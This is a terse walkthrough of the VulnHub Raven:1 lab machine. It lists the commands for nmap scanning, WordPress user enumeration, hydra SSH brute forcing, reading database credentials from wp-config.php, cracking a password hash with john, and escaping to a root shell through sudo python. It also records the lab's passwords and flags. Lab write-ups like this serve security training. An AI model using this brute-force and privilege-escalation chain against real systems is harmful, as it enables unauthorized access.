

# Raven:1 Walkthrough

**VulnHub Link:** [Raven:1](https://www.vulnhub.com/entry/raven-1,256/)
**Difficulty:** Easy
**Release Date:** 14 Aug 2018


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.141


## 2.Web Enumeration

from /service.html ---> flag1 found
flag1{b9bbcb33e11b80be759c4e844862482d}


sudo echo "192.168.100.141	raven.local" > /etc/hosts
wpscan --url 'http://raven.local/wordpress' -e ap,u
michael and steven users found..!


## 3.Brute Force
hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.141 -I 
michael : michael found

ssh connection 

from /var/www ---> flag2 found
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}


we obtain root password on mysql service from /var/www/html/wp-config.php ---> R@v3nSecurity
mysql> show databases;
mysql> use wordpress;
mysql> show tables;
mysql> select *from wp_posts; flag3 and flag4 found
flag3{afc01ab56b50591e7dccf93122770cd2}
flag4{715dea6c055b9fe3337544932f2941ce}


## 4.Cracking

and we obtain steven'password hash from wp_users 
echo '$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/' > hash1.txt


## 5.Privilege Escalation

zcat /usr/share/wordlists/rockyou.txt | john hash1.txt --pipe
steven : pink84 found

sudo -l ---> ALL (NOPASSWRD) : /usr/bin/python

sudo python -c 'import os; os.system("/bin/sh")' 

AND BINGO!!!! Root shell opened...!
